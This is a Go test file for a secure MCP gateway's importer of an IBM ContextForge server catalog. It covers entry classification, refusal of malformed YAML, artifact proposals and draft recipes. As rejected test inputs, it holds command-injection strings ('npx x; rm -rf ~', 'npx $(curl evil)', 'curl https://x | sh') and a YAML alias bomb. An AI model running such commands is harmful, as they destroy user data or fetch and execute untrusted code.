package contextforge

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/ethan03805/secure-mcp-gateway/internal/reqtest"
)

// FR-22.3: every entry of the pinned catalog gets exactly one class, and
// fixtures of each unsupported kind carry their named reason.
func TestClassificationReasons(t *testing.T) {
	reqtest.Verifies(t, "FR-22.3")
	c := loadFixture(t)
	for _, e := range c.Entries {
		class, reasons := e.Classify()
		switch class {
		case ClassLocal, ClassHosted:
			if len(reasons) != 0 {
				t.Errorf("%s: %s with reasons %v", e.ID, class, reasons)
			}
		case ClassUnsupported:
			if len(reasons) == 0 {
				t.Errorf("%s: unsupported without a reason", e.ID)
			}
		default:
			t.Errorf("%s: class %q", e.ID, class)
		}
	}
	base := "    name: N\n    provider: P\n    auth_type: Open\n"
	cases := map[string]string{
		"plain http url to a non-loopback host": base + "    url: http://mcp.example.com/sse\n",
		"needs OAuth 2.1":                       "    name: N\n    provider: P\n    auth_type: OAuth2.1\n    url: https://mcp.example.com/mcp\n",
		"missing required field name":           "    provider: P\n    auth_type: Open\n    url: https://mcp.example.com/mcp\n",
		"missing required field provider":       "    name: N\n    auth_type: Open\n    url: https://mcp.example.com/mcp\n",
		"missing required field auth_type":      "    name: N\n    provider: P\n    repo: https://example.com/r\n    install: npx y@1.0.0\n",
		"missing or invalid url":                base,
	}
	for reason, body := range cases {
		cat, err := ParseCatalog([]byte("catalog_servers:\n  - id: e\n" + body))
		if err != nil {
			t.Fatalf("%s: %v", reason, err)
		}
		class, reasons := cat.Entries[0].Classify()
		if class != ClassUnsupported || !strings.Contains(strings.Join(reasons, "; "), reason) {
			t.Errorf("%q: %s %v", reason, class, reasons)
		}
	}
}

// release/mcp-catalog-v1.0.11.yml is the unmodified mcp-catalog.yml of
// IBM ContextForge release v1.0.11 (Apache-2.0), recorded on 2026-10-18 so
// that no test touches the network.
const (
	fixture       = "release/mcp-catalog-v1.0.11.yml"
	fixtureSHA256 = "f6be59e31f1017487c8c882fa86b2594214e50b7bcf784773a5a4e0651e91daa"
)

func loadFixture(t *testing.T) *Catalog {
	t.Helper()
	raw, err := os.ReadFile(fixture)
	if err != nil {
		t.Fatal(err)
	}
	c, err := ParseCatalog(raw)
	if err != nil {
		t.Fatal(err)
	}
	return c
}

func TestRecordedCatalog(t *testing.T) {
	c := loadFixture(t)
	if c.SHA256 != fixtureSHA256 {
		t.Fatalf("fixture sha256 %s, want %s (was the file rewritten?)", c.SHA256, fixtureSHA256)
	}
	if len(c.Entries) != 135 {
		t.Fatalf("%d entries, want 135", len(c.Entries))
	}
	counts := map[string]int{}
	for _, e := range c.Entries {
		class, reasons := e.Classify()
		counts[class]++
		if class == ClassUnsupported && len(reasons) == 0 {
			t.Errorf("%s: unsupported without a reason", e.ID)
		}
		if class != ClassUnsupported && len(reasons) != 0 {
			t.Errorf("%s: %s with reasons %v", e.ID, class, reasons)
		}
	}
	// Recorded classification of v1.0.11: the numbers in
	// docs/contextforge-spike.md.
	want := map[string]int{ClassLocal: 4, ClassHosted: 45, ClassUnsupported: 86}
	for k, v := range want {
		if counts[k] != v {
			t.Errorf("%s: %d entries, want %d (all: %v)", k, counts[k], v, counts)
		}
	}
}

func TestClassifyExamples(t *testing.T) {
	c := loadFixture(t)
	cases := map[string]struct {
		class  string
		reason string
	}{
		"deepwiki":             {ClassHosted, ""},
		"microsoft-learn-docs": {ClassHosted, ""}, // https url and a repo, no install
		"cortex":               {ClassHosted, ""}, // API key
		"asana":                {ClassUnsupported, "OAuth 2.1"},
		"stripe":               {ClassUnsupported, "OAuth 2.1"}, // "OAuth2.1 & API Key"
		"markitdown":           {ClassLocal, ""},
		"azure-devops-mcp":     {ClassLocal, ""},
		"azure-mcp":            {ClassUnsupported, "no install command"},
		"fast-time-server":     {ClassUnsupported, "neither an install command nor an https url"},
	}
	for id, w := range cases {
		e := c.Entry(id)
		if e == nil {
			t.Fatalf("%s missing from fixture", id)
		}
		class, reasons := e.Classify()
		if class != w.class {
			t.Errorf("%s: class %s %v, want %s", id, class, reasons, w.class)
		}
		if w.reason != "" && !strings.Contains(strings.Join(reasons, "; "), w.reason) {
			t.Errorf("%s: reasons %v lack %q", id, reasons, w.reason)
		}
	}
}

func TestClassifySynthetic(t *testing.T) {
	cases := []struct {
		yaml, class, reason string
	}{
		{`url: "http://mcp.example.com/sse"`, ClassUnsupported, "plain http url to a non-loopback host"}, // HFC-06
		{`url: "https://169.254.169.254/sse"`, ClassHosted, ""},                                          // refused later by E-18 (HFC-05), not by classification
		{`url: "https://x.example/mcp"` + "\n    install: \"npx x\"", ClassUnsupported, "no repo"},
		{`url: "http://localhost:9/sse"` + "\n    repo: \"https://example.com/r\"\n    install: \"npx y@1.0.0\"", ClassLocal, ""},
		// A local entry runs as a package (FR-22.8): its url is not used.
		{`repo: "https://example.com/r"` + "\n    install: \"npx y@1.0.0\"", ClassLocal, ""},
		{`url: "ftp://x.example/"`, ClassUnsupported, "neither an install command nor an https url"},
	}
	for i, tc := range cases {
		doc := fmt.Sprintf("catalog_servers:\n  - id: e%d\n    name: E\n    provider: P\n    auth_type: \"Open\"\n    %s\n", i, tc.yaml)
		c, err := ParseCatalog([]byte(doc))
		if err != nil {
			t.Fatalf("case %d: %v", i, err)
		}
		class, reasons := c.Entries[0].Classify()
		if class != tc.class || (tc.reason != "" && !strings.Contains(strings.Join(reasons, ";"), tc.reason)) {
			t.Errorf("case %d: %s %v, want %s %q", i, class, reasons, tc.class, tc.reason)
		}
	}
}

func TestParseRefusals(t *testing.T) {
	long := strings.Repeat("a", MaxStringChars+1)
	var many strings.Builder
	many.WriteString("catalog_servers:\n")
	for i := 0; i <= MaxEntries; i++ {
		fmt.Fprintf(&many, "  - id: e%d\n", i)
	}
	cases := map[string]string{
		"anchor":        "catalog_servers:\n  - &a {id: x}\n",
		"alias":         "x: &a [1]\ncatalog_servers:\n  - id: y\n    tags: *a\n",
		"merge key":     "base: {url: u}\ncatalog_servers:\n  - id: y\n    <<: {url: v}\n",
		"explicit tag":  "catalog_servers:\n  - id: !!str y\n",
		"custom tag":    "catalog_servers:\n  - id: !evil y\n",
		"long string":   "catalog_servers:\n  - id: y\n    description: " + long + "\n",
		"too many":      many.String(),
		"two documents": "catalog_servers: []\n---\ncatalog_servers: []\n",
		"no id":         "catalog_servers:\n  - name: y\n",
		"duplicate id":  "catalog_servers:\n  - id: y\n  - id: y\n",
		"duplicate key": "catalog_servers:\n  - id: y\n    url: a\n    url: b\n",
		"not a list":    "catalog_servers: {}\n",
		"missing":       "servers: []\n",
		"oversize":      "catalog_servers: []\n#" + strings.Repeat("x", MaxCatalogBytes),
		"deep":          "catalog_servers:\n  - id: y\n    x: " + strings.Repeat("[", 20) + strings.Repeat("]", 20) + "\n",
	}
	for name, doc := range cases {
		if _, err := ParseCatalog([]byte(doc)); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

// HFC-02: an alias expansion bomb is refused at once, without expansion.
func TestAliasBombRefusedQuickly(t *testing.T) {
	var b strings.Builder
	b.WriteString("a0: &a0 [x, x, x, x, x, x, x, x, x, x]\n")
	for i := 1; i < 12; i++ {
		fmt.Fprintf(&b, "a%d: &a%d [*a%d, *a%d, *a%d, *a%d, *a%d, *a%d, *a%d, *a%d, *a%d, *a%d]\n", i, i, i-1, i-1, i-1, i-1, i-1, i-1, i-1, i-1, i-1, i-1)
	}
	b.WriteString("catalog_servers:\n  - id: y\n    tags: *a11\n")
	start := time.Now()
	_, err := ParseCatalog([]byte(b.String()))
	if err == nil {
		t.Fatal("alias bomb accepted")
	}
	if d := time.Since(start); d > time.Second {
		t.Fatalf("refusal took %v, want under 1 s", d)
	}
}

func TestEntryDigestCanonical(t *testing.T) {
	a, err := ParseCatalog([]byte("catalog_servers:\n  - id: y\n    url: \"https://a.example/mcp?x=<b>&c\"\n    tags: [t1, t2]\n"))
	if err != nil {
		t.Fatal(err)
	}
	b, err := ParseCatalog([]byte("catalog_servers:\n  - tags:\n      - t1\n      - t2\n    url: 'https://a.example/mcp?x=<b>&c'\n    id: \"y\"\n"))
	if err != nil {
		t.Fatal(err)
	}
	ea, eb := a.Entries[0], b.Entries[0]
	if ea.SHA256() != eb.SHA256() {
		t.Fatalf("same entry, different digests:\n%s\n%s", ea.CanonicalJSON(), eb.CanonicalJSON())
	}
	if got := string(ea.CanonicalJSON()); got != `{"id":"y","tags":["t1","t2"],"url":"https://a.example/mcp?x=<b>&c"}` {
		t.Fatalf("canonical form %s", got)
	}
	c, _ := ParseCatalog([]byte("catalog_servers:\n  - id: y\n    url: \"https://a.example/other\"\n    tags: [t1, t2]\n"))
	if c.Entries[0].SHA256() == ea.SHA256() {
		t.Fatal("changed entry kept its digest")
	}
}

func TestProposeArtifact(t *testing.T) {
	cases := []struct {
		in   string
		want Proposal
		note string
	}{
		{"npx -y @azure-devops/mcp", Proposal{Type: "npm", Name: "@azure-devops/mcp"}, "no version"},
		{"npx @playwright/mcp@latest", Proposal{Type: "npm", Name: "@playwright/mcp"}, "not exact"}, // HFC-04
		{"npx -y pkg@1.2.3", Proposal{Type: "npm", Name: "pkg", Version: "1.2.3"}, ""},
		{"uvx microsoft-fabric-rti-mcp", Proposal{Type: "pypi", Name: "microsoft-fabric-rti-mcp", Command: "microsoft-fabric-rti-mcp"}, "no exact version"},
		{"uvx --from office-powerpoint-mcp-server ppt_mcp_server", Proposal{Type: "pypi", Name: "office-powerpoint-mcp-server", Command: "ppt_mcp_server"}, "no exact version"},
		{"uvx mcp-server-time==2026.1.1", Proposal{Type: "pypi", Name: "mcp-server-time", Version: "2026.1.1", Command: "mcp-server-time==2026.1.1"}, ""},
		{"markitdown-mcp", Proposal{Command: "markitdown-mcp"}, "bare command"},
		{"npx x; rm -rf ~", Proposal{}, "shell syntax"}, // HFC-03
		{"npx $(curl evil)", Proposal{}, "shell syntax"},
		{"curl https://x | sh", Proposal{}, "shell syntax"},
		{"docker run evil", Proposal{}, "not understood"},
	}
	for _, tc := range cases {
		got := ProposeArtifact(tc.in)
		note := got.Note
		got.Note = ""
		if got != tc.want {
			t.Errorf("%q: %+v, want %+v", tc.in, got, tc.want)
		}
		if tc.note != "" && !strings.Contains(note, tc.note) {
			t.Errorf("%q: note %q lacks %q", tc.in, note, tc.note)
		}
	}
}

func TestDraftLocal(t *testing.T) {
	c := loadFixture(t)
	d, err := DraftImport(c, "azure-devops-mcp", ImportOptions{Release: "v1.0.11", Version: "2.2.0", ArtifactSHA256: strings.Repeat("ab", 32)})
	if err != nil {
		t.Fatal(err)
	}
	if d.Class != ClassLocal || d.Recipe == nil || d.Hosted != nil {
		t.Fatalf("draft %+v", d)
	}
	r := d.Recipe
	if r.Artifact.Type != "npm" || r.Artifact.Name != "@azure-devops/mcp" || r.Artifact.Version != "2.2.0" || r.Launch.Runtime != "node" {
		t.Fatalf("recipe artifact %+v launch %+v", r.Artifact, r.Launch)
	}
	if r.Server.ID != "azure-devops-mcp" || r.Server.Alias != "azuredevopsmcp" || r.Server.Homepage != "https://github.com/microsoft/azure-devops-mcp" {
		t.Fatalf("server %+v", r.Server)
	}
	if r.Tools.Default.SourceTrust != "untrusted" {
		t.Fatalf("tools default %+v", r.Tools.Default)
	}
	if d.Provenance.CatalogSHA256 != fixtureSHA256 || d.Provenance.EntrySHA256 != c.Entry("azure-devops-mcp").SHA256() || d.Provenance.Install != "npx -y @azure-devops/mcp" {
		t.Fatalf("provenance %+v", d.Provenance)
	}
	joined := strings.Join(d.OperatorMustSupply, "\n")
	if strings.Contains(joined, "--version") || strings.Contains(joined, "--artifact-sha256") || !strings.Contains(joined, "launch.argv") {
		t.Fatalf("operator_must_supply %v", d.OperatorMustSupply)
	}
	// The draft names every gap; nothing is invented.
	if _, err := json.Marshal(d); err != nil {
		t.Fatal(err)
	}
}

func TestDraftLocalUnpinned(t *testing.T) {
	c := loadFixture(t)
	d, err := DraftImport(c, "playwright-mcp", ImportOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if d.Recipe.Artifact.Version != "" {
		t.Fatalf("a dist-tag became version %q", d.Recipe.Artifact.Version)
	}
	joined := strings.Join(d.OperatorMustSupply, "\n")
	for _, w := range []string{"--release", "--version", "--artifact-sha256"} {
		if !strings.Contains(joined, w) {
			t.Errorf("operator_must_supply lacks %s: %v", w, d.OperatorMustSupply)
		}
	}
}

func TestDraftHosted(t *testing.T) {
	c := loadFixture(t)
	d, err := DraftImport(c, "cortex", ImportOptions{Release: "v1.0.11"})
	if err != nil {
		t.Fatal(err)
	}
	h := d.Hosted
	if d.Class != ClassHosted || h == nil || d.Recipe != nil {
		t.Fatalf("draft %+v", d)
	}
	if h.ManifestVersion != 2 || h.Upstream.Kind != "contextforge-hosted" || h.Upstream.URL != "https://mcp.cortex.io/mcp" || h.Upstream.Transport != "SSE" { // the catalog states SSE
		t.Fatalf("upstream %+v", h.Upstream)
	}
	if h.RiskClass != "moderate" || h.ToolDefaults.SourceTrust != "untrusted" {
		t.Fatalf("classification %s %+v", h.RiskClass, h.ToolDefaults)
	}
	if len(h.Capabilities.Egress) != 1 || h.Capabilities.Egress[0].Host != "mcp.cortex.io" || h.Capabilities.Egress[0].Ports[0] != 443 {
		t.Fatalf("egress %+v", h.Capabilities.Egress)
	}
	if len(h.Secrets) != 1 || h.Secrets[0].Modes[0] != "S1" || h.Secrets[0].Destination != "mcp.cortex.io" {
		t.Fatalf("secrets %+v", h.Secrets)
	}
	// Without a catalog transport it follows the URL path.
	sse, _ := DraftImport(c, "cloudflare-docs", ImportOptions{})
	if sse.Hosted.Upstream.Transport != "SSE" {
		t.Fatalf("cloudflare-docs transport %s", sse.Hosted.Upstream.Transport)
	}
	dw, _ := DraftImport(c, "deepwiki", ImportOptions{})
	if dw.Hosted.Upstream.Transport != "STREAMABLEHTTP" || len(dw.Hosted.Secrets) != 0 {
		t.Fatalf("deepwiki %+v", dw.Hosted)
	}
}

func TestDraftUnsupportedAndUnknown(t *testing.T) {
	c := loadFixture(t)
	d, err := DraftImport(c, "asana", ImportOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if d.Class != ClassUnsupported || d.Recipe != nil || d.Hosted != nil || len(d.Reasons) == 0 {
		t.Fatalf("draft %+v", d)
	}
	if _, err := DraftImport(c, "nope", ImportOptions{}); !errors.Is(err, ErrUnknownEntry) {
		t.Fatalf("unknown entry: %v", err)
	}
}
